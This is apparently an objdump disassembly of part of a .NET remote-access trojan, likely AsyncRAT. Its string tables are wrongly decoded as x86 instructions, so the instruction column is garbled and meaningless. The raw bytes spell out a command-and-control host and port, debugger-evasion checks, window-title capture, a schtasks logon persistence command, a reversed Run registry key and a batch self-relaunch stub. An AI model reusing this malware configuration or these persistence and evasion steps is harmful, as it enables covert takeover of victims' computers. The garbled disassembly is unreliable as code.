  406e86:	6c                   	insb   (%dx),%es:(%edi)
  406e87:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  406e8e:	74 5f                	je     0x406eef
  406e90:	53                   	push   %ebx
  406e91:	73 6c                	jae    0x406eff
  406e93:	43                   	inc    %ebx
  406e94:	6c                   	insb   (%dx),%es:(%edi)
  406e95:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  406e9c:	74 5f                	je     0x406efd
  406e9e:	53                   	push   %ebx
  406e9f:	73 6c                	jae    0x406f0d
  406ea1:	43                   	inc    %ebx
  406ea2:	6c                   	insb   (%dx),%es:(%edi)
  406ea3:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  406eaa:	74 5f                	je     0x406f0b
  406eac:	54                   	push   %esp
  406ead:	63 70 43             	arpl   %esi,0x43(%eax)
  406eb0:	6c                   	insb   (%dx),%es:(%edi)
  406eb1:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  406eb8:	74 5f                	je     0x406f19
  406eba:	54                   	push   %esp
  406ebb:	63 70 43             	arpl   %esi,0x43(%eax)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  406ec6:	74 68                	je     0x406f30
  406ec8:	65 6e                	outsb  %gs:(%esi),(%dx)
  406eca:	74 69                	je     0x406f35
  406ecc:	63 61 74             	arpl   %esp,0x74(%ecx)
  406ecf:	65 41                	gs inc %ecx
  406ed1:	73 43                	jae    0x406f16
  406ed3:	6c                   	insb   (%dx),%es:(%edi)
  406ed4:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  406edb:	73 74                	jae    0x406f51
  406edd:	65 6d                	gs insl (%dx),%es:(%edi)
  406edf:	2e 4d                	cs dec %ebp
  406ee1:	61                   	popa
  406ee2:	6e                   	outsb  %ds:(%esi),(%dx)
  406ee3:	61                   	popa
  406ee4:	67 65 6d             	gs insl (%dx),%es:(%di)
  406ee7:	65 6e                	outsb  %gs:(%esi),(%dx)
  406ee9:	74 00                	je     0x406eeb
  406eeb:	45                   	inc    %ebp
  406eec:	6e                   	outsb  %ds:(%esi),(%dx)
  406eed:	76 69                	jbe    0x406f58
  406eef:	72 6f                	jb     0x406f60
  406ef1:	6e                   	outsb  %ds:(%esi),(%dx)
  406ef2:	6d                   	insl   (%dx),%es:(%edi)
  406ef3:	65 6e                	outsb  %gs:(%esi),(%dx)
  406ef5:	74 00                	je     0x406ef7
  406ef7:	67 65 74 5f          	addr16 gs je 0x406f5a
  406efb:	43                   	inc    %ebx
  406efc:	75 72                	jne    0x406f70
  406efe:	72 65                	jb     0x406f65
  406f00:	6e                   	outsb  %ds:(%esi),(%dx)
  406f01:	74 00                	je     0x406f03
  406f03:	47                   	inc    %edi
  406f04:	65 74 43             	gs je  0x406f4a
  406f07:	75 72                	jne    0x406f7b
  406f09:	72 65                	jb     0x406f70
  406f0b:	6e                   	outsb  %ds:(%esi),(%dx)
  406f0c:	74 00                	je     0x406f0e
  406f0e:	43                   	inc    %ebx
  406f0f:	68 65 63 6b 52       	push   $0x526b6365
  406f14:	65 6d                	gs insl (%dx),%es:(%edi)
  406f16:	6f                   	outsl  %ds:(%esi),(%dx)
  406f17:	74 65                	je     0x406f7e
  406f19:	44                   	inc    %esp
  406f1a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406f1e:	67 65 72 50          	addr16 gs jb 0x406f72
  406f22:	72 65                	jb     0x406f89
  406f24:	73 65                	jae    0x406f8b
  406f26:	6e                   	outsb  %ds:(%esi),(%dx)
  406f27:	74 00                	je     0x406f29
  406f29:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  406f30:	67 65 72 50          	addr16 gs jb 0x406f84
  406f34:	72 65                	jb     0x406f9b
  406f36:	73 65                	jae    0x406f9d
  406f38:	6e                   	outsb  %ds:(%esi),(%dx)
  406f39:	74 00                	je     0x406f3b
  406f3b:	67 65 74 5f          	addr16 gs je 0x406f9e
  406f3f:	52                   	push   %edx
  406f40:	65 6d                	gs insl (%dx),%es:(%edi)
  406f42:	6f                   	outsl  %ds:(%esi),(%dx)
  406f43:	74 65                	je     0x406faa
  406f45:	45                   	inc    %ebp
  406f46:	6e                   	outsb  %ds:(%esi),(%dx)
  406f47:	64 50                	fs push %eax
  406f49:	6f                   	outsl  %ds:(%esi),(%dx)
  406f4a:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  406f51:	5f                   	pop    %edi
  406f52:	43                   	inc    %ebx
  406f53:	6f                   	outsl  %ds:(%esi),(%dx)
  406f54:	75 6e                	jne    0x406fc4
  406f56:	74 00                	je     0x406f58
  406f58:	67 65 74 5f          	addr16 gs je 0x406fbb
  406f5c:	50                   	push   %eax
  406f5d:	72 6f                	jb     0x406fce
  406f5f:	63 65 73             	arpl   %esp,0x73(%ebp)
  406f62:	73 6f                	jae    0x406fd3
  406f64:	72 43                	jb     0x406fa9
  406f66:	6f                   	outsl  %ds:(%esi),(%dx)
  406f67:	75 6e                	jne    0x406fd7
  406f69:	74 00                	je     0x406f6b
  406f6b:	63 6f 75             	arpl   %ebp,0x75(%edi)
  406f6e:	6e                   	outsb  %ds:(%esi),(%dx)
  406f6f:	74 00                	je     0x406f71
  406f71:	47                   	inc    %edi
  406f72:	65 74 50             	gs je  0x406fc5
  406f75:	61                   	popa
  406f76:	74 68                	je     0x406fe0
  406f78:	52                   	push   %edx
  406f79:	6f                   	outsl  %ds:(%esi),(%dx)
  406f7a:	6f                   	outsl  %ds:(%esi),(%dx)
  406f7b:	74 00                	je     0x406f7d
  406f7d:	44                   	inc    %esp
  406f7e:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  406f82:	70 74                	jo     0x406ff8
  406f84:	00 45 6e             	add    %al,0x6e(%ebp)
  406f87:	63 72 79             	arpl   %esi,0x79(%edx)
  406f8a:	70 74                	jo     0x407000
  406f8c:	00 50 61             	add    %dl,0x61(%eax)
  406f8f:	72 61                	jb     0x406ff2
  406f91:	6d                   	insl   (%dx),%es:(%edi)
  406f92:	65 74 65             	gs je  0x406ffa
  406f95:	72 69                	jb     0x407000
  406f97:	7a 65                	jp     0x406ffe
  406f99:	64 54                	fs push %esp
  406f9b:	68 72 65 61 64       	push   $0x64616572
  406fa0:	53                   	push   %ebx
  406fa1:	74 61                	je     0x407004
  406fa3:	72 74                	jb     0x407019
  406fa5:	00 43 6f             	add    %al,0x6f(%ebx)
  406fa8:	6e                   	outsb  %ds:(%esi),(%dx)
  406fa9:	76 65                	jbe    0x407010
  406fab:	72 74                	jb     0x407021
  406fad:	00 46 61             	add    %al,0x61(%esi)
  406fb0:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  406fb7:	54 
  406fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  406fb9:	4c                   	dec    %esp
  406fba:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  406fc1:	75 74                	jne    0x407037
  406fc3:	00 4d 6f             	add    %cl,0x6f(%ebp)
  406fc6:	76 65                	jbe    0x40702d
  406fc8:	4e                   	dec    %esi
  406fc9:	65 78 74             	gs js  0x407040
  406fcc:	00 53 79             	add    %dl,0x79(%ebx)
  406fcf:	73 74                	jae    0x407045
  406fd1:	65 6d                	gs insl (%dx),%es:(%edi)
  406fd3:	2e 54                	cs push %esp
  406fd5:	65 78 74             	gs js  0x40704c
  406fd8:	00 47 65             	add    %al,0x65(%edi)
  406fdb:	74 57                	je     0x407034
  406fdd:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  406fe4:	78 74                	js     0x40705a
  406fe6:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  406fea:	74 00                	je     0x406fec
  406fec:	47                   	inc    %edi
  406fed:	65 74 46             	gs je  0x407036
  406ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  406ff1:	72 65                	jb     0x407058
  406ff3:	67 72 6f             	addr16 jb 0x407065
  406ff6:	75 6e                	jne    0x407066
  406ff8:	64 57                	fs push %edi
  406ffa:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  407001:	65 74 5f             	gs je  0x407063
  407004:	43                   	inc    %ebx
  407005:	72 65                	jb     0x40706c
  407007:	61                   	popa
  407008:	74 65                	je     0x40706f
  40700a:	4e                   	dec    %esi
  40700b:	6f                   	outsl  %ds:(%esi),(%dx)
  40700c:	57                   	push   %edi
  40700d:	69 6e 64 6f 77 00 43 	imul   $0x4300776f,0x64(%esi),%ebp
  407014:	6c                   	insb   (%dx),%es:(%edi)
  407015:	6f                   	outsl  %ds:(%esi),(%dx)
  407016:	73 65                	jae    0x40707d
  407018:	4d                   	dec    %ebp
  407019:	75 74                	jne    0x40708f
  40701b:	65 78 00             	gs js  0x40701e
  40701e:	43                   	inc    %ebx
  40701f:	72 65                	jb     0x407086
  407021:	61                   	popa
  407022:	74 65                	je     0x407089
  407024:	4d                   	dec    %ebp
  407025:	75 74                	jne    0x40709b
  407027:	65 78 00             	gs js  0x40702a
  40702a:	44                   	inc    %esp
  40702b:	65 6c                	gs insb (%dx),%es:(%edi)
  40702d:	61                   	popa
  40702e:	79 00                	jns    0x407030
  407030:	49                   	dec    %ecx
  407031:	6e                   	outsb  %ds:(%esi),(%dx)
  407032:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  407039:	65 
  40703a:	41                   	inc    %ecx
  40703b:	72 72                	jb     0x4070af
  40703d:	61                   	popa
  40703e:	79 00                	jns    0x407040
  407040:	54                   	push   %esp
  407041:	6f                   	outsl  %ds:(%esi),(%dx)
  407042:	41                   	inc    %ecx
  407043:	72 72                	jb     0x4070b7
  407045:	61                   	popa
  407046:	79 00                	jns    0x407048
  407048:	67 65 74 5f          	addr16 gs je 0x4070ab
  40704c:	4b                   	dec    %ebx
  40704d:	65 79 00             	gs jns 0x407050
  407050:	73 65                	jae    0x4070b7
  407052:	74 5f                	je     0x4070b3
  407054:	4b                   	dec    %ebx
  407055:	65 79 00             	gs jns 0x407058
  407058:	43                   	inc    %ebx
  407059:	72 65                	jb     0x4070c0
  40705b:	61                   	popa
  40705c:	74 65                	je     0x4070c3
  40705e:	53                   	push   %ebx
  40705f:	75 62                	jne    0x4070c3
  407061:	4b                   	dec    %ebx
  407062:	65 79 00             	gs jns 0x407065
  407065:	44                   	inc    %esp
  407066:	65 6c                	gs insb (%dx),%es:(%edi)
  407068:	65 74 65             	gs je  0x4070d0
  40706b:	53                   	push   %ebx
  40706c:	75 62                	jne    0x4070d0
  40706e:	4b                   	dec    %ebx
  40706f:	65 79 00             	gs jns 0x407072
  407072:	4f                   	dec    %edi
  407073:	70 65                	jo     0x4070da
  407075:	6e                   	outsb  %ds:(%esi),(%dx)
  407076:	53                   	push   %ebx
  407077:	75 62                	jne    0x4070db
  407079:	4b                   	dec    %ebx
  40707a:	65 79 00             	gs jns 0x40707d
  40707d:	67 65 74 5f          	addr16 gs je 0x4070e0
  407081:	50                   	push   %eax
  407082:	75 62                	jne    0x4070e6
  407084:	6c                   	insb   (%dx),%es:(%edi)
  407085:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  40708c:	61                   	popa
  40708d:	75 74                	jne    0x407103
  40708f:	68 4b 65 79 00       	push   $0x79654b
  407094:	6d                   	insl   (%dx),%es:(%edi)
  407095:	61                   	popa
  407096:	73 74                	jae    0x40710c
  407098:	65 72 4b             	gs jb  0x4070e6
  40709b:	65 79 00             	gs jns 0x40709e
  40709e:	52                   	push   %edx
  40709f:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4070a6:	4b 65 
  4070a8:	79 00                	jns    0x4070aa
  4070aa:	5f                   	pop    %edi
  4070ab:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  4070af:	53                   	push   %ebx
  4070b0:	79 73                	jns    0x407125
  4070b2:	74 65                	je     0x407119
  4070b4:	6d                   	insl   (%dx),%es:(%edi)
  4070b5:	2e 53                	cs push %ebx
  4070b7:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4070bb:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4070c2:	70 
  4070c3:	74 6f                	je     0x407134
  4070c5:	67 72 61             	addr16 jb 0x407129
  4070c8:	70 68                	jo     0x407132
  4070ca:	79 00                	jns    0x4070cc
  4070cc:	41                   	inc    %ecx
  4070cd:	73 73                	jae    0x407142
  4070cf:	65 6d                	gs insl (%dx),%es:(%edi)
  4070d1:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4070d5:	41                   	inc    %ecx
  4070d6:	64 64 72 65          	fs fs jb 0x40713f
  4070da:	73 73                	jae    0x40714f
  4070dc:	46                   	inc    %esi
  4070dd:	61                   	popa
  4070de:	6d                   	insl   (%dx),%es:(%edi)
  4070df:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  4070e6:	63 
  4070e7:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  4070eb:	79 00                	jns    0x4070ed
  4070ed:	67 65 74 5f          	addr16 gs je 0x407150
  4070f1:	53                   	push   %ebx
  4070f2:	79 73                	jns    0x407167
  4070f4:	74 65                	je     0x40715b
  4070f6:	6d                   	insl   (%dx),%es:(%edi)
  4070f7:	44                   	inc    %esp
  4070f8:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4070ff:	79 00                	jns    0x407101
  407101:	53                   	push   %ebx
  407102:	65 74 52             	gs je  0x407157
  407105:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40710c:	00 6f 
  40710e:	70 5f                	jo     0x40716f
  407110:	45                   	inc    %ebp
  407111:	71 75                	jno    0x407188
  407113:	61                   	popa
  407114:	6c                   	insb   (%dx),%es:(%edi)
  407115:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40711c:	49 
  40711d:	6e                   	outsb  %ds:(%esi),(%dx)
  40711e:	65 71 75             	gs jno 0x407196
  407121:	61                   	popa
  407122:	6c                   	insb   (%dx),%es:(%edi)
  407123:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  40712a:	74 
  40712b:	65 6d                	gs insl (%dx),%es:(%edi)
  40712d:	2e 4e                	cs dec %esi
  40712f:	65 74 2e             	gs je  0x407160
  407132:	53                   	push   %ebx
  407133:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407137:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  40713e:	64 
  40713f:	6f                   	outsl  %ds:(%esi),(%dx)
  407140:	77 73                	ja     0x4071b5
  407142:	49                   	dec    %ecx
  407143:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407146:	74 69                	je     0x4071b1
  407148:	74 79                	je     0x4071c3
  40714a:	00 49 73             	add    %cl,0x73(%ecx)
  40714d:	4e                   	dec    %esi
  40714e:	75 6c                	jne    0x4071bc
  407150:	6c                   	insb   (%dx),%es:(%edi)
  407151:	4f                   	dec    %edi
  407152:	72 45                	jb     0x407199
  407154:	6d                   	insl   (%dx),%es:(%edi)
  407155:	70 74                	jo     0x4071cb
  407157:	79 00                	jns    0x407159
  407159:	00 00                	add    %al,(%eax)
  40715b:	00 00                	add    %al,(%eax)
  40715d:	0d 53 00 48 00       	or     $0x480053,%eax
  407162:	41                   	inc    %ecx
  407163:	00 32                	add    %dh,(%edx)
  407165:	00 35 00 36 00 00    	add    %dh,0x3600
  40716b:	07                   	pop    %es
  40716c:	34 00                	xor    $0x0,%al
  40716e:	34 00                	xor    $0x0,%al
  407170:	33 00                	xor    (%eax),%eax
  407172:	00 17                	add    %dl,(%edi)
  407174:	63 00                	arpl   %eax,(%eax)
  407176:	61                   	popa
  407177:	00 7a 00             	add    %bh,0x0(%edx)
  40717a:	61                   	popa
  40717b:	00 2e                	add    %ch,(%esi)
  40717d:	00 69 00             	add    %ch,0x0(%ecx)
  407180:	74 00                	je     0x407182
  407182:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407186:	6f                   	outsl  %ds:(%esi),(%dx)
  407187:	00 6d 00             	add    %ch,0x0(%ebp)
  40718a:	00 0d 30 00 2e 00    	add    %cl,0x2e0030
  407190:	35 00 2e 00 37       	xor    $0x37002e00,%eax
  407195:	00 42 00             	add    %al,0x0(%edx)
  407198:	00 0b                	add    %cl,(%ebx)
  40719a:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40719e:	6c                   	insb   (%dx),%es:(%edi)
  40719f:	00 73 00             	add    %dh,0x0(%ebx)
  4071a2:	65 00 00             	add    %al,%gs:(%eax)
  4071a5:	0f 41 00             	cmovno (%eax),%eax
  4071a8:	70 00                	jo     0x4071aa
  4071aa:	70 00                	jo     0x4071ac
  4071ac:	44                   	inc    %esp
  4071ad:	00 61 00             	add    %ah,0x0(%ecx)
  4071b0:	74 00                	je     0x4071b2
  4071b2:	61                   	popa
  4071b3:	00 00                	add    %al,(%eax)
  4071b5:	11 54 00 65          	adc    %edx,0x65(%eax,%eax,1)
  4071b9:	00 73 00             	add    %dh,0x0(%ebx)
  4071bc:	74 00                	je     0x4071be
  4071be:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4071c2:	78 00                	js     0x4071c4
  4071c4:	65 00 00             	add    %al,%gs:(%eax)
  4071c7:	11 4e 00             	adc    %ecx,0x0(%esi)
  4071ca:	59                   	pop    %ecx
  4071cb:	00 41 00             	add    %al,0x0(%ecx)
  4071ce:	4e                   	dec    %esi
  4071cf:	00 20                	add    %ah,(%eax)
  4071d1:	00 43 00             	add    %al,0x0(%ebx)
  4071d4:	41                   	inc    %ecx
  4071d5:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  4071d9:	0b 25 00 4d 00 54    	or     0x54004d00,%esp
  4071df:	00 58 00             	add    %bl,0x0(%eax)
  4071e2:	25 00 00 1b 25       	and    $0x251b0000,%eax
  4071e7:	00 43 00             	add    %al,0x0(%ebx)
  4071ea:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4071ee:	74 00                	je     0x4071f0
  4071f0:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  4071f6:	63 00                	arpl   %eax,(%eax)
  4071f8:	61                   	popa
  4071f9:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4071fd:	00 25 00 00 23 25    	add    %ah,0x25230000
  407203:	00 53 00             	add    %dl,0x0(%ebx)
  407206:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40720a:	76 00                	jbe    0x40720c
  40720c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407210:	73 00                	jae    0x407212
  407212:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  407218:	61                   	popa
  407219:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40721d:	00 72 00             	add    %dh,0x0(%edx)
  407220:	65 00 25 00 00 09 6e 	add    %ah,%gs:0x6e090000
  407227:	00 75 00             	add    %dh,0x0(%ebp)
  40722a:	6c                   	insb   (%dx),%es:(%edi)
  40722b:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40722f:	03 30                	add    (%eax),%esi
  407231:	00 00                	add    %al,(%eax)
  407233:	0b 44 00 65          	or     0x65(%eax,%eax,1),%eax
  407237:	00 62 00             	add    %ah,0x0(%edx)
  40723a:	75 00                	jne    0x40723c
  40723c:	67 00 00             	add    %al,(%bx,%si)
  40723f:	01 00                	add    %eax,(%eax)
  407241:	03 3a                	add    (%edx),%edi
  407243:	00 00                	add    %al,(%eax)
  407245:	15 43 00 6f 00       	adc    $0x6f0043,%eax
  40724a:	6e                   	outsb  %ds:(%esi),(%dx)
  40724b:	00 6e 00             	add    %ch,0x0(%esi)
  40724e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407252:	74 00                	je     0x407254
  407254:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  407259:	00 00                	add    %al,(%eax)
  40725b:	1b 44 00 69          	sbb    0x69(%eax,%eax,1),%eax
  40725f:	00 73 00             	add    %dh,0x0(%ebx)
  407262:	63 00                	arpl   %eax,(%eax)
  407264:	6f                   	outsl  %ds:(%esi),(%dx)
  407265:	00 6e 00             	add    %ch,0x0(%esi)
  407268:	6e                   	outsb  %ds:(%esi),(%dx)
  407269:	00 65 00             	add    %ah,0x0(%ebp)
  40726c:	63 00                	arpl   %eax,(%eax)
  40726e:	74 00                	je     0x407270
  407270:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  407275:	00 00                	add    %al,(%eax)
  407277:	2d 2f 00 2f 00       	sub    $0x2f002f,%eax
  40727c:	2f                   	das
  40727d:	00 20                	add    %ah,(%eax)
  40727f:	00 43 00             	add    %al,0x0(%ebx)
  407282:	6c                   	insb   (%dx),%es:(%edi)
  407283:	00 69 00             	add    %ch,0x0(%ecx)
  407286:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40728a:	74 00                	je     0x40728c
  40728c:	20 00                	and    %al,(%eax)
  40728e:	42                   	inc    %edx
  40728f:	00 75 00             	add    %dh,0x0(%ebp)
  407292:	66 00 66 00          	data16 add %ah,0x0(%esi)
  407296:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40729a:	73 00                	jae    0x40729c
  40729c:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  4072a2:	20 00                	and    %al,(%eax)
  4072a4:	00 17                	add    %dl,(%edi)
  4072a6:	20 00                	and    %al,(%eax)
  4072a8:	42                   	inc    %edx
  4072a9:	00 79 00             	add    %bh,0x0(%ecx)
  4072ac:	74 00                	je     0x4072ae
  4072ae:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4072b2:	20 00                	and    %al,(%eax)
  4072b4:	20 00                	and    %al,(%eax)
  4072b6:	2f                   	das
  4072b7:	00 2f                	add    %ch,(%edi)
  4072b9:	00 2f                	add    %ch,(%edi)
  4072bb:	00 00                	add    %al,(%eax)
  4072bd:	17                   	pop    %ss
  4072be:	73 00                	jae    0x4072c0
  4072c0:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4072c4:	64 00 20             	add    %ah,%fs:(%eax)
  4072c7:	00 63 00             	add    %ah,0x0(%ebx)
  4072ca:	68 00 75 00 6e       	push   $0x6e007500
  4072cf:	00 6b 00             	add    %ch,0x0(%ebx)
  4072d2:	73 00                	jae    0x4072d4
  4072d4:	00 0d 50 00 61 00    	add    %cl,0x610050
  4072da:	63 00                	arpl   %eax,(%eax)
  4072dc:	6b 00 65             	imul   $0x65,(%eax),%eax
  4072df:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4072e3:	09 50 00             	or     %edx,0x0(%eax)
  4072e6:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4072ec:	00 0f                	add    %cl,(%edi)
  4072ee:	4d                   	dec    %ebp
  4072ef:	00 65 00             	add    %ah,0x0(%ebp)
  4072f2:	73 00                	jae    0x4072f4
  4072f4:	73 00                	jae    0x4072f6
  4072f6:	61                   	popa
  4072f7:	00 67 00             	add    %ah,0x0(%edi)
  4072fa:	65 00 00             	add    %al,%gs:(%eax)
  4072fd:	07                   	pop    %es
  4072fe:	63 00                	arpl   %eax,(%eax)
  407300:	6d                   	insl   (%dx),%es:(%edi)
  407301:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  407305:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40730b:	00 73 00             	add    %dh,0x0(%ebx)
  40730e:	63 00                	arpl   %eax,(%eax)
  407310:	68 00 74 00 61       	push   $0x61007400
  407315:	00 73 00             	add    %dh,0x0(%ebx)
  407318:	6b 00 73             	imul   $0x73,(%eax),%eax
  40731b:	00 20                	add    %ah,(%eax)
  40731d:	00 2f                	add    %ch,(%edi)
  40731f:	00 63 00             	add    %ah,0x0(%ebx)
  407322:	72 00                	jb     0x407324
  407324:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407328:	74 00                	je     0x40732a
  40732a:	65 00 20             	add    %ah,%gs:(%eax)
  40732d:	00 2f                	add    %ch,(%edi)
  40732f:	00 66 00             	add    %ah,0x0(%esi)
  407332:	20 00                	and    %al,(%eax)
  407334:	2f                   	das
  407335:	00 73 00             	add    %dh,0x0(%ebx)
  407338:	63 00                	arpl   %eax,(%eax)
  40733a:	20 00                	and    %al,(%eax)
  40733c:	6f                   	outsl  %ds:(%esi),(%dx)
  40733d:	00 6e 00             	add    %ch,0x0(%esi)
  407340:	6c                   	insb   (%dx),%es:(%edi)
  407341:	00 6f 00             	add    %ch,0x0(%edi)
  407344:	67 00 6f 00          	add    %ch,0x0(%bx)
  407348:	6e                   	outsb  %ds:(%esi),(%dx)
  407349:	00 20                	add    %ah,(%eax)
  40734b:	00 2f                	add    %ch,(%edi)
  40734d:	00 72 00             	add    %dh,0x0(%edx)
  407350:	6c                   	insb   (%dx),%es:(%edi)
  407351:	00 20                	add    %ah,(%eax)
  407353:	00 68 00             	add    %ch,0x0(%eax)
  407356:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40735c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407360:	74 00                	je     0x407362
  407362:	20 00                	and    %al,(%eax)
  407364:	2f                   	das
  407365:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  407369:	00 20                	add    %ah,(%eax)
  40736b:	00 22                	add    %ah,(%edx)
  40736d:	00 00                	add    %al,(%eax)
  40736f:	11 22                	adc    %esp,(%edx)
  407371:	00 20                	add    %ah,(%eax)
  407373:	00 2f                	add    %ch,(%edi)
  407375:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  407379:	00 20                	add    %ah,(%eax)
  40737b:	00 27                	add    %ah,(%edi)
  40737d:	00 22                	add    %ah,(%edx)
  40737f:	00 01                	add    %al,(%ecx)
  407381:	13 22                	adc    (%edx),%esp
  407383:	00 27                	add    %ah,(%edi)
  407385:	00 20                	add    %ah,(%eax)
  407387:	00 26                	add    %ah,(%esi)
  407389:	00 20                	add    %ah,(%eax)
  40738b:	00 65 00             	add    %ah,0x0(%ebp)
  40738e:	78 00                	js     0x407390
  407390:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  407396:	5c                   	pop    %esp
  407397:	00 6e 00             	add    %ch,0x0(%esi)
  40739a:	75 00                	jne    0x40739c
  40739c:	52                   	push   %edx
  40739d:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  4073a1:	00 6f 00             	add    %ch,0x0(%edi)
  4073a4:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  4073aa:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  4073ae:	74 00                	je     0x4073b0
  4073b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4073b1:	00 65 00             	add    %ah,0x0(%ebp)
  4073b4:	72 00                	jb     0x4073b6
  4073b6:	72 00                	jb     0x4073b8
  4073b8:	75 00                	jne    0x4073ba
  4073ba:	43                   	inc    %ebx
  4073bb:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  4073bf:	00 77 00             	add    %dh,0x0(%edi)
  4073c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4073c3:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  4073c7:	00 69 00             	add    %ch,0x0(%ecx)
  4073ca:	57                   	push   %edi
  4073cb:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  4073cf:	00 66 00             	add    %ah,0x0(%esi)
  4073d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4073d3:	00 73 00             	add    %dh,0x0(%ebx)
  4073d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4073d7:	00 72 00             	add    %dh,0x0(%edx)
  4073da:	63 00                	arpl   %eax,(%eax)
  4073dc:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  4073e2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4073e6:	61                   	popa
  4073e7:	00 77 00             	add    %dh,0x0(%edi)
  4073ea:	74 00                	je     0x4073ec
  4073ec:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4073f0:	53                   	push   %ebx
  4073f1:	00 00                	add    %al,(%eax)
  4073f3:	03 22                	add    (%edx),%esp
  4073f5:	00 00                	add    %al,(%eax)
  4073f7:	09 2e                	or     %ebp,(%esi)
  4073f9:	00 62 00             	add    %ah,0x0(%edx)
  4073fc:	61                   	popa
  4073fd:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  407401:	13 40 00             	adc    0x0(%eax),%eax
  407404:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407408:	68 00 6f 00 20       	push   $0x20006f00
  40740d:	00 6f 00             	add    %ch,0x0(%edi)
  407410:	66 00 66 00          	data16 add %ah,0x0(%esi)
  407414:	00 1f                	add    %bl,(%edi)
  407416:	74 00                	je     0x407418
  407418:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40741e:	6f                   	outsl  %ds:(%esi),(%dx)
  40741f:	00 75 00             	add    %dh,0x0(%ebp)
  407422:	74 00                	je     0x407424
  407424:	20 00                	and    %al,(%eax)
  407426:	33 00                	xor    (%eax),%eax
  407428:	20 00                	and    %al,(%eax)
